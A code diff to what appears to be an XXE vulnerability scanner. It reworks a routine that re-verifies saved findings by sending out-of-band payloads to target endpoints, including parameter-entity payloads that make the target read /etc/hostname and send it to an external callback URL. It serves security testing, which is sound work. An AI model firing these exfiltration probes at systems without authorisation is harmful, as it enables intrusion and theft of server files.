@@ -30,8 +30,11 @@ class RegressionRunner:
         self.oob = oob
 
     def verify_finding(self, finding, oob_base: str,
-                       wait: float = 6.0) -> Dict:
-        """Re-run an OOB payload against the finding's endpoint."""
+                       wait: Optional[float] = None) -> Dict:
+        """Re-run an OOB payload against the finding's endpoint.
+
+        settle window defaults to cfg.oob_wait (configurable via CLI/env).
+        """
         cid = new_canary()
         kind = "oob_probe_http"
         # prefer parameter entity exfil if the original was file read
@@ -45,7 +48,8 @@ class RegressionRunner:
         status, body, headers, elapsed = self.client.post(
             finding.endpoint_url, data=data.encode("utf-8"),
             headers={"Content-Type": ctype}, allow_redirects=True)
-        time.sleep(min(wait, 4))
+        settle = wait if wait and wait > 0 else self.cfg.oob_wait
+        time.sleep(max(0.0, settle))
         hits = self.oob.hits_for(cid)
         return {
             "finding_id": finding.id,
@@ -70,25 +74,47 @@ def run_regression(cfg: ScanConfig, client: HttpClient, oob: OOBServer,
     return {"checked": results, "verified": verified, "total": len(results)}
 
 
-def verify_from_json(json_path: str, cfg: ScanConfig) -> Dict:
-    """Verify a saved result file without rescanning."""
+def verify_from_json(json_path: str, cfg: ScanConfig,
+                     oob_base: Optional[str] = None) -> Dict:
+    """Verify a saved result file without rescanning.
+
+    oob_base is the externally reachable OOB callback URL (e.g. a Cloudflare
+    tunnel); falls back to localhost when not provided or when the tunnel is
+    unavailable.
+    """
+    oob_base = oob_base or f"http://127.0.0.1:{cfg.oob_port}"
     with open(json_path, "r", encoding="utf-8") as f:
         data = json.load(f)
     findings = data.get("findings", [])
+    if not findings:
+        return {"results": [], "verified": 0, "total": 0}
+    # one shared OOB server for all verifications: avoids bind races when
+    # stop/start on the same port between findings and gives the parser
+    # a stable callback URL across the whole run.
+    oob = OOBServer(cfg.oob_port)
+    if not oob.start():
+        return {"results": [], "verified": 0, "total": 0,
+                "error": "OOB server could not start"}
+    client = HttpClient(cfg, headers=cfg.headers, cookies=cfg.cookies)
     out = []
-    for f in findings:
-        cid = new_canary()
-        kind = "oob_probe_http"
-        _, ctype, data_ = get_payload(kind, cid=cid,
-                                      oob_base=f"http://127.0.0.1:{cfg.oob_port}")
-        oob = OOBServer(cfg.oob_port)
-        oob.start()
-        client = HttpClient(cfg, headers=cfg.headers, cookies=cfg.cookies)
-        try:
-            status, body, headers, elapsed = client.post(
-                f.get("endpoint_url", ""), data=data_.encode("utf-8"),
-                headers={"Content-Type": ctype}, allow_redirects=True)
-            time.sleep(4)
+    try:
+        for f in findings:
+            cid = new_canary()
+            kind = "oob_probe_http"
+            if (f.get("impact") or {}).get("confidentiality") == "high":
+                kind = "oob_parameter_entity"
+                oob.register_dtd(cid, dtd_payload(cid, oob_base,
+                                                  "file:///etc/hostname",
+                                                  php=False))
+            _, ctype, data_ = get_payload(kind, cid=cid, oob_base=oob_base)
+            try:
+                status, body, headers, elapsed = client.post(
+                    f.get("endpoint_url", ""), data=data_.encode("utf-8"),
+                    headers={"Content-Type": ctype}, allow_redirects=True)
+            except Exception as e:  # noqa: BLE001
+                log.warn(f"verify request failed for {f.get('endpoint_url')}: {e}")
+                status = 0
+            time.sleep(max(0.0, cfg.oob_wait))
             hits = oob.hits_for(cid)
             out.append({
                 "finding": f.get("cve_id") or f.get("title"),
@@ -97,10 +123,13 @@ def verify_from_json(json_path: str, cfg: ScanConfig) -> Dict:
                 "oob_hits": len(hits),
                 "status": status,
             })
-        finally:
-            client.close()
-            oob.stop()
+    finally:
+        client.close()
+        oob.stop()
     verified = sum(1 for r in out if r["verified"])
     log.info(f"verify: {verified}/{len(out)} findings re-confirmed")
     return {"results": out, "verified": verified, "total": len(out)}
+
+
+
 
